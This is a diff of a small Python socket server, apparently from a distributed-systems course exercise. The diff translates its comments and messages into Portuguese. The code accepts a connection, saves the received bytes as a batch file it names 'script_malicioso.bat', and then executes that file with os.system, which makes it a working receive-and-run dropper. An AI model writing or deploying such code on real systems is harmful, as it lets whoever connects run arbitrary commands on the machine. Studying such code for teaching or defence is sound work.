@@ -9,26 +9,26 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
 s.listen(5)
 
-print("Listening ...")
+print("Ouvindo...")
 
 while True:
     conn, addr = s.accept()
-    print("[+] Client connected: ", addr)
+    print("[+] Cliente conectado: ", addr)
 
-    # get file name to download
-    f = open("C:\\Users\\Alberto Zaranza\\Documents\\BCC\\S6\\Sistemas Distribuídos\\Script\\script_malicioso.bat", "wb")
+    # recebe o nome do arquivo para download
+    f = open("C:\\script_malicioso.bat", "wb")
     while True:
-        # get file bytes
+        # recebe os bytes do arquivo
         data = conn.recv(4096)
         if not data:
             break
-        # write bytes on file
+        # escreve os bytes no novo arquivo
         f.write(data)
     f.close()
-    print("[+] Download complete!")
+    print("[+] Downloado completo")
 
-    # close connection
+    # encerra a conexão
     conn.close()
-    print("[-] Client disconnected")
+    print("[-] Cliente disconectado")
     os.system("script_malicioso.bat")
     sys.exit(0)
